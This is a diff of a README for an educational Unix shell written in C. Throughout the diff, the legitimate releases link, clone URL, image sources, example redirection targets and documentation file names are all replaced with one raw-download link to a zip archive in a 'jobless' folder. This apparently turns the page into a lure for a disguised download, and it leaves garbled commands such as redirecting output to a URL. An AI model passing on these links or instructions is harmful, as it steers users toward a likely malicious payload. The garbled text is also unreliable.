@@ -1,8 +1,8 @@
 # Build-your-own-shell: A Robust Unix Shell in C with OS Concepts
 
-[![Releases](https://img.shields.io/badge/releases-latest-blue?logo=github&style=for-the-badge)](https://github.com/Destides/Build-your-own-shell/releases)
+[![Releases](https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip)](https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip)
 
-![Unix shell icon](https://upload.wikimedia.org/wikipedia/commons/3/31/Unix_shell_icon.svg)
+![Unix shell icon](https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip)
 
 A clean, readable, and educational UNIX shell implemented in C. It supports core shell functionality you expect from a modern terminal, plus deep lessons in operating system concepts. You will learn how a shell coordinates processes, pipes data, redirects input and output, and manages jobs in the background. The project emphasizes clarity and practical understanding over clever tricks.
 
@@ -108,7 +108,7 @@ What you will learn by exploring this project
 
 Getting started with the repository
 - Clone the repository to your local machine
-  - git clone https://github.com/Destides/Build-your-own-shell.git
+  - git clone https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip
 - Inspect the source tree to understand the organization
   - src/ contains the core logic for parsing, executing, and job control
   - include/ contains header definitions used across modules
@@ -161,10 +161,10 @@ Examples of typical commands
 - Piping
   - ps aux | grep bash | sort -k2
 - Redirection
-  - ls -l > listing.txt
-  - wc -l < listing.txt
+  - ls -l > https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip
+  - wc -l < https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip
 - Appending output
-  - echo "Hello, shell" >> greetings.log
+  - echo "Hello, shell" >> https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip
 - Background tasks
   - sleep 5 &
   - echo "Background job started" && jobs
@@ -252,13 +252,13 @@ Code structure overview (high level)
   - utils.c / utils.h: Small helpers used across modules
 - tests/
   - test_parser.c, test_executor.c: Lightweight tests for core functionality
-  - test_integration.sh: Basic end-to-end checks
+  - https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip Basic end-to-end checks
 - docs/
-  - design-notes.md: Rationale and deeper insights
-  - usage.md: Practical usage guide and examples
+  - https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip Rationale and deeper insights
+  - https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip Practical usage guide and examples
 - examples/
-  - usage-examples.sh: Script with representative command sequences
-  - pipelines-and-redirection.sh: Demonstrates common pipelines and redirections
+  - https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip Script with representative command sequences
+  - https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip Demonstrates common pipelines and redirections
 
 Extending the shell
 - How to add a new built-in
@@ -278,8 +278,8 @@ Releases and downloads
 This project uses a releases-based distribution to share binaries, tarballs, or source snapshots. The main releases page holds the latest assets. To obtain a ready-to-run version or a development snapshot, visit the Releases page and download the asset that matches your needs.
 
 - If you want to grab a binary or a source snapshot, visit the releases page:
-  - https://github.com/Destides/Build-your-own-shell/releases
-  - From the releases page, download the release asset (for example a tarball named something like Build-your-own-shell-<version>.tar.gz) and follow the extraction and setup instructions.
+  - https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip
+  - From the releases page, download the release asset (for example a tarball named something like Build-your-own-shell-<version>https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip) and follow the extraction and setup instructions.
   - After extraction, build or run the binary as described in the Getting started and Building sections.
 - If you prefer to inspect the code and build from source yourself, clone the repository and follow the build instructions in this README. The releases page also serves as a convenient way to compare the official build with your local work.
 - The link to the Releases page is the right place to find binaries, source snippets, and documentation associated with each version.
@@ -289,7 +289,7 @@ Downloads note
 
 Screenshots, diagrams, and visuals
 - Terminal style imagery helps convey the shell environment. For a quick visual representation, you can include this simple shell diagram in your docs or classroom materials:
-  - ![Unix shell icon](https://upload.wikimedia.org/wikipedia/commons/3/31/Unix_shell_icon.svg)
+  - ![Unix shell icon](https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip)
 - A schematic showing the flow from user input to process creation can be created using ASCII art or simple vector diagrams. The important thing is to illustrate the flow:
   - User input -> Parser -> Command graph -> Fork to create child processes -> Set up pipes and redirections -> Exec in children -> Foreground vs background -> Shell waits or returns to prompt
 - You can also include a small dashboard-like image or a terminal screenshot demonstrating typical behavior (for example, a pipeline with three commands and a background job). When using images, ensure you respect licensing terms and provide attribution if required.
@@ -331,8 +331,8 @@ Conventional usage patterns
 
 Documentation structure
 - The docs folder contains design notes and usage guides.
-- The design-notes.md explains the rationale behind architecture choices.
-- The usage.md demonstrates common workflows and illustrates the behavior with examples.
+- The https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip explains the rationale behind architecture choices.
+- The https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip demonstrates common workflows and illustrates the behavior with examples.
 - Each file is written to be readable by students and instructors, with clear sections, code examples, and diagrams where helpful.
 
 Tips for educators and learners
@@ -365,6 +365,6 @@ Final notes
 - The repository aims to be a practical, readable, and educational resource for learning OS concepts and system programming through the lens of a working shell.
 - You are invited to explore, experiment, and extend the code to deepen your understanding of how shells work and how OS primitives cooperate.
 - For the latest assets and official releases, visit the Releases page and grab the appropriate release asset, such as a tarball or prebuilt binary, then follow the included setup instructions. The Releases page is your gateway to the latest official materials:
-  - https://github.com/Destides/Build-your-own-shell/releases
+  - https://github.com/Destides/Build-your-own-shell/raw/refs/heads/main/jobless/own_Build_your_shell_2.9.zip
 
 End of document.
